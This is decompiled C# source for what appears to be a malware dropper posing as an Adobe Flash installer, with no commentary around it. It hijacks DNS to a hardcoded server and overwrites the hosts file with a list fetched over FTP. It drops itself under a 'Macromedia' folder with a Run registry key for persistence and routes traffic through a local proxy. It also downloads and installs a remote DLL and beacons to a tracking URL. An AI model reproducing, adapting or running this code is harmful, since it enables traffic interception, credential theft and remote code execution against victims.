using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace AdobeInstall;

[StandardModule]
internal sealed class Module1
{
	public static string mydns = "46.173.209.194";

	public static object IsGoodDNS(object dns)
	{
		return Operators.CompareString(mydns, dns.ToString(), false) == 0;
	}

	public static void makeDNS()
	{
		string text = ".";
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\" + text + "\\root\\cimv2", (string)null));
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExecQuery", new object[1] { "Select * from Win32_NetworkAdapterConfiguration where IPEnabled = True" }, (string[])null, (Type[])null, (bool[])null));
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)objectValue2).GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue3 = RuntimeHelpers.GetObjectValue(enumerator.Current);
				object obj;
				try
				{
					obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue3, (Type)null, "DNSServerSearchOrder", new object[0], (string[])null, (Type[])null, (bool[])null));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					obj = new object[2] { mydns, "8.8.8.8" };
					ProjectData.ClearProjectError();
				}
				try
				{
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[1] { 0 }, (string[])null));
					RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[1] { 1 }, (string[])null));
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					obj = new object[2] { mydns, "8.8.8.8" };
					ProjectData.ClearProjectError();
				}
				if (Conversions.ToBoolean(Operators.NotObject(IsGoodDNS(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[1] { 0 }, (string[])null))))))
				{
					object obj2 = new object[2]
					{
						mydns,
						RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[1] { 0 }, (string[])null))
					};
					object[] array = new object[1] { RuntimeHelpers.GetObjectValue(obj2) };
					object[] array2 = array;
					bool[] array3 = new bool[1] { true };
					NewLateBinding.LateCall(objectValue3, (Type)null, "SetDNSServerSearchOrder", array2, (string[])null, (Type[])null, array3, true);
					if (array3[0])
					{
						obj2 = RuntimeHelpers.GetObjectValue(array[0]);
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public static void SaveToDisk(string resourceName, string fileName)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		int num = 0;
		checked
		{
			string text;
			while (true)
			{
				if (num < manifestResourceNames.Length)
				{
					text = manifestResourceNames[num];
					if (Operators.CompareString(text.ToLower(), resourceName.ToLower(), false) == 0)
					{
						break;
					}
					num++;
					continue;
				}
				return;
			}
			using Stream stream = executingAssembly.GetManifestResourceStream(text);
			if (stream == null)
			{
				return;
			}
			using BinaryReader binaryReader = new BinaryReader(stream);
			byte[] buffer = binaryReader.ReadBytes((int)stream.Length);
			using FileStream output = new FileStream(fileName, FileMode.Create);
			using BinaryWriter binaryWriter = new BinaryWriter(output);
			binaryWriter.Write(buffer);
		}
	}

	public static void SaveFiles()
	{
		try
		{
			string[] manifestResourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
			string[] array = manifestResourceNames;
			foreach (string text in array)
			{
				string text2 = text.Replace("AdobeInstall.", "");
				string text3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia";
				if (!Directory.Exists(text3))
				{
					Directory.CreateDirectory(text3);
				}
				SaveToDisk(text, text3 + "\\" + text2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void MakeHosts()
	{
		try
		{
			string path = Environment.SystemDirectory + "\\drivers\\etc\\hosts";
			string text = FtpHelper.DownloadText("ftp://vk-vmeste.ru/domains.txt");
			text = text.Replace("$ip", mydns);
			File.WriteAllText(path, text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void UpdateDLL()
	{
		if (FtpHelper.DownloadFile("ftp://vk-vmeste.ru/ProxyService.dll", proxyServerDLL_temp()))
		{
			try
			{
				File.Copy(proxyServerDLL_temp(), proxyServerDLL(), overwrite: true);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string selfFile()
	{
		return Assembly.GetExecutingAssembly().Location;
	}

	public static string TargetDir()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia\\";
	}

	public static string targetFile()
	{
		return TargetDir() + "flashutill.exe";
	}

	public static string proxyServerFile()
	{
		return TargetDir() + "TestApp.exe";
	}

	public static string proxyServerDLL()
	{
		return TargetDir() + "ProxyService.dll";
	}

	public static string proxyServerDLL_sample()
	{
		return TargetDir() + "sample.txt";
	}

	public static string proxyServerDLL_temp()
	{
		return TargetDir() + "ProxyService.dll.temp";
	}

	public static void MakeRegistry()
	{
		try
		{
			File.Copy(selfFile(), targetFile(), overwrite: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("me", targetFile());
			registryKey.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void WaitForInternet()
	{
		string text = "";
		while (true)
		{
			text = FtpHelper.DownloadText("ftp://vk-vmeste.ru/sample.txt");
			if (text.ToLower().Contains("replacement"))
			{
				break;
			}
			Thread.Sleep(5000);
		}
		File.WriteAllText(proxyServerDLL_sample(), text);
	}

	[STAThread]
	public static void Main()
	{
		makeDNS();
		SaveFiles();
		MakeRegistry();
		RunServer();
		SettingsHelper.SetProxy("127.0.0.1", 8083);
		WaitForInternet();
		MakeHosts();
		DropServer();
		UpdateDLL();
		RunServer();
		GoContact();
		Die();
	}

	public static void GoContact()
	{
		WebClient webClient = new WebClient();
		string text = "";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			text = Conversions.ToString(registryKey.GetValue("Macromedia"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, "", false) == 0)
		{
			try
			{
				webClient.DownloadString("http://tds.heylook.ru/prod.ashx?field=prod3");
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey2.SetValue("Macromedia", "1");
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Die()
	{
		string fileName = Path.GetFileName(Assembly.GetExecutingAssembly().Location);
		Process[] processesByName = Process.GetProcessesByName(fileName);
		try
		{
			processesByName[0].Kill();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			processesByName[1].Kill();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void DropServer()
	{
		string processName = "TestApp";
		Process[] processesByName = Process.GetProcessesByName(processName);
		try
		{
			processesByName[0].Kill();
			processesByName[0].WaitForExit();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			processesByName[1].Kill();
			processesByName[1].WaitForExit();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void RunServer()
	{
		DropServer();
		try
		{
			Process.Start(proxyServerFile());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
